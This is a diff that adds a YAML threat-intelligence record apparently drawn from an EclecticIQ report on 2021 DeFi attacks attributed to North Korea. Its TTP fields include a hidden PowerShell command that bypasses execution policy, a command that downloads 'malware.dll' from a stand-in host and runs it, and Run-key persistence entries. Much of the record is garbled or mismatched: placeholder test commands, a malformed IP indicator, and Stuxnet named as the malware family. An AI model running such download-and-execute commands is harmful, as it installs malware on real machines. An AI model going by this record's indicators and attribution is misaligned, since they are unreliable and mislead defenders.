@@ -1,0 +1,63 @@
+description: 'This report analyzes cyberattacks against decentralized finance (DeFi)
+  platforms in 2021, identifying repeating attack patterns and areas for security
+  resource development to mitigate future large-scale attacks. Cryptocurrency surpassed
+  $1 trillion in total market value in 2021, with illicit transaction volume reaching
+  record highs, attracting threat actors to DeFi as a source of profit.
+
+  '
+attribution: North Korea
+TTPs:
+  processes:
+  - EthCrossChainManager
+  - EthCrossChainData
+  - powershell.exe
+  - cmd.exe
+  - wscript.exe
+  - cscript.exe
+  commandline:
+  - ''
+  - '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -ExecutionPolicy
+    Bypass -WindowStyle Hidden -File C:\\Users\\Public\\Documents\\test.ps1'
+  - '"C:\\Windows\\system32\\cmd.exe" /c "echo Hello > C:\\temp\\test.txt"'
+  powershell:
+  - Invoke-WebRequest -Uri "http://example.com/malware.dll" -OutFile C:\\temp\\malware.dll
+  - C:\\temp\\malware.dll
+  scripting_engine: []
+  registry_keys:
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  - HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load: []
+  network_connections:
+  - executable: powershell.exe
+    destination_address: http://example.com/
+    port: '80'
+  - executable: cmd.exe
+    destination_address: 1.215.85, 9 \\
+    port: ''
+  file_modifications:
+  - C:\\Users\\Public\\Documents\\test.ps1
+  - C:\\temp\\malware.dll
+  - C:\\temp\\test.txt
+  persistence:
+  - Compromise of critical systems
+  - Mismanagement across third party systems enhances risk
+  - Registry Run keys (HKCU and HKLM)
+  pipes: []
+  process_relations: []
+IOCs:
+- Wallet addresses associated with stolen cryptocurrency (over $10 billion)
+- Poly Network vulnerable function (verifyHeaderAndExecuteTx)
+- Uranium Finance forked code from Uniswap v2
+- Ronin Bridge validator node compromise
+- Kucoin exchange private key exposure
+- BitMart hot wallet private key compromise
+- EasyFi founder's compromised machine
+- http://example.com/malware.dll
+- 1.215.85, 9 \\
+authors:
+- EclecticIQ Threat Research Team
+malware_families:
+- Stuxnet
+reference: https://blog.eclecticiq.com/attack-patterns-produce-growing-losses-targeting-mutual-vulnerabilities-endemic-to-decentralized-finance
+date_of_publication: April 06, 2022
+file_creation_date: May 16, 2025
